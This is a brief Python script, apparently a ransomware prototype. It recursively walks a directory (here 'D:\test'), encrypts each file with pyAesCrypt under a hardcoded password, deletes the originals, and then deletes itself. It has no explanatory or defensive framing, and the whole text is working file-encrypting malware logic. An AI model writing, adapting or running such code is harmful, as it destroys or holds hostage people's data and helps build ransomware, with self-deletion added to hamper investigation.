
import os, sys
def crypt(file):
	import pyAesCrypt
	print("---------------------------------------------------------------" )
	password="hello"
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	print("[crypted] '"+str(file)+".crp'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir): 
		path = os.path.join(dir, name)
		if os.path.isfile(path): crypt(path)
		else: walk(path)
walk("D:\\test")
print("---------------------------------------------------------------" )
os.remove(str(sys.argv[0]))